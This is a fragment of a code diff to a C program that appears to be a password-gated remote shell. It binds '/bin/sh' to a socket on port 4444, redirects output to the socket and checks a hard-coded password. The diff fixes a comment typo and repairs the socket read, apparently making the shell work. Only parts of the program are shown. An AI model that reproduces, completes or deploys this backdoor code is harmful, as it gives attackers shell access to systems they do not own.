@@ -13,7 +13,7 @@ int main()
         struct sockaddr_in server;
         int sock;
         int sockaddr_len = sizeof(struct sockaddr_in);
-        // Change aguments as needed
+        // Change arguments as needed
         char *arguments[] = { "/bin/sh", 0, "4444", "127.0.0.1", "YOLOOOOOOO" };
 
 
@@ -30,7 +30,7 @@ int main()
         dup2(sock, 1);
         dup2(sock, 2);
 
-        read(new_sock, buf, 16);
+        read(sock, buf, 16);
         buf[strcspn(buf, "\n")] = 0;
         if (strcmp(arguments[4], buf) == 0)
         {        
